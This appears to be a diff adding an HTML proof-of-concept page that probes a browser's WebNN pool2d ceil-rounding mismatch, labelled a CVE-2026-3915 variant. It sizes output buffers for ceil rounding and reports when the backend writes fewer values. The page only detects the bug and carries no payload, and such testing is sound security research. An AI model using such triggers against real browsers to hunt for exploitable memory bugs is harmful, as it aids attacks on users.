@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html>
+<head><title>WebNN pool2d ceil rounding mismatch - PoC 1</title></head>
+<body>
+<h2>WebNN pool2d ceil rounding mismatch (CVE-2026-3915 variant)</h2>
+<pre id="output"></pre>
+<script>
+const log = (msg) => {
+  console.log(msg);
+  document.getElementById('output').textContent += msg + '\n';
+};
+
+async function testPool2dCeilRounding() {
+  log('=== PoC 1: Basic pool2d ceil rounding mismatch ===');
+  log('Testing if CoreML backend mishandles roundingType:"ceil" with zero padding');
+  log('');
+
+  if (!navigator.ml) {
+    log('ERROR: WebNN API not available. Need --enable-features=WebMachineLearningNeuralNetwork');
+    return;
+  }
+
+  let context, builder;
+  try {
+    context = await navigator.ml.createContext({ deviceType: 'gpu' });
+    builder = new MLGraphBuilder(context);
+    log('MLContext created (gpu/CoreML backend)');
+  } catch(e) {
+    log('GPU context failed: ' + e.message);
+    try {
+      context = await navigator.ml.createContext({ deviceType: 'cpu' });
+      builder = new MLGraphBuilder(context);
+      log('MLContext created (cpu backend)');
+    } catch(e2) {
+      log('CPU context also failed: ' + e2.message);
+      return;
+    }
+  }
+
+  // Input: [1, 1, 5, 5] NCHW
+  // Window: [2, 2], Strides: [2, 2], Padding: [0,0,0,0], roundingType: ceil
+  // Floor: output_h = floor((5-2)/2) + 1 = 2, output_w = 2 → [1,1,2,2]
+  // Ceil:  output_h = ceil((5-2)/2) + 1 = 3,  output_w = 3 → [1,1,3,3]
+
+  const inputShape = [1, 1, 5, 5];
+  const inputData = new Float32Array(25);
+  for (let i = 0; i < 25; i++) inputData[i] = i + 1; // 1..25
+
+  log('Input shape: [1, 1, 5, 5]');
+  log('Input data: ' + Array.from(inputData).join(', '));
+  log('Window: [2,2], Strides: [2,2], Padding: [0,0,0,0]');
+  log('roundingType: "ceil"');
+  log('');
+  log('Expected with floor rounding: output shape [1,1,2,2] (4 elements)');
+  log('Expected with ceil rounding:  output shape [1,1,3,3] (9 elements)');
+  log('');
+
+  try {
+    const input = builder.input('input', { dataType: 'float32', shape: inputShape });
+
+    // Test averagePool2d with ceil rounding
+    log('--- Testing averagePool2d ---');
+    const avgPool = builder.averagePool2d(input, {
+      windowDimensions: [2, 2],
+      strides: [2, 2],
+      padding: [0, 0, 0, 0],
+      roundingType: 'ceil',
+      layout: 'nchw'
+    });
+
+    const graph = await builder.build({ 'avgOutput': avgPool });
+    log('Graph built successfully');
+
+    // Allocate output buffer for ceil-rounded size [1,1,3,3] = 9 elements
+    const inputBuffer = new Float32Array(inputData);
+    const outputBuffer = new Float32Array(9);
+
+    const results = await context.compute(graph, { 'input': inputBuffer }, { 'avgOutput': outputBuffer });
+    log('Compute completed');
+
+    const output = results.outputs.avgOutput || outputBuffer;
+    log('Output values: ' + Array.from(output).join(', '));
+    log('Output length: ' + output.length);
+
+    // Check if we got 9 values (ceil) or only 4 (floor)
+    const nonZeroCount = Array.from(output).filter(v => v !== 0).length;
+    log('Non-zero values: ' + nonZeroCount);
+
+    if (nonZeroCount <= 4) {
+      log('');
+      log('*** POTENTIAL MISMATCH: Only ' + nonZeroCount + ' non-zero values ***');
+      log('*** CoreML likely used floor rounding internally ***');
+      log('*** Buffer was sized for 9 (ceil) but only 4 (floor) values written ***');
+      log('*** This matches CVE-2026-3915 pattern! ***');
+    } else if (nonZeroCount === 9) {
+      log('Output has 9 non-zero values - ceil rounding applied correctly');
+    }
+
+  } catch(e) {
+    log('ERROR during averagePool2d test: ' + e.message);
+    log('Stack: ' + e.stack);
+  }
+
+  // Test maxPool2d
+  try {
+    const input2 = builder.input('input2', { dataType: 'float32', shape: inputShape });
+    log('');
+    log('--- Testing maxPool2d ---');
+    const maxPool = builder.maxPool2d(input2, {
+      windowDimensions: [2, 2],
+      strides: [2, 2],
+      padding: [0, 0, 0, 0],
+      roundingType: 'ceil',
+      layout: 'nchw'
+    });
+
+    const graph2 = await builder.build({ 'maxOutput': maxPool });
+    log('MaxPool graph built successfully');
+
+    const inputBuffer2 = new Float32Array(inputData);
+    const outputBuffer2 = new Float32Array(9);
+
+    const results2 = await context.compute(graph2, { 'input2': inputBuffer2 }, { 'maxOutput': outputBuffer2 });
+    log('MaxPool compute completed');
+
+    const output2 = results2.outputs.maxOutput || outputBuffer2;
+    log('Output values: ' + Array.from(output2).join(', '));
+    log('Output length: ' + output2.length);
+
+    const nonZeroCount2 = Array.from(output2).filter(v => v !== 0).length;
+    log('Non-zero values: ' + nonZeroCount2);
+
+    if (nonZeroCount2 <= 4) {
+      log('*** POTENTIAL MISMATCH in maxPool2d too! ***');
+    }
+
+  } catch(e) {
+    log('ERROR during maxPool2d test: ' + e.message);
+    log('Stack: ' + e.stack);
+  }
+
+  log('');
+  log('=== PoC 1 Complete ===');
+}
+
+testPool2dCeilRounding();
+</script>
+</body>
+</html>
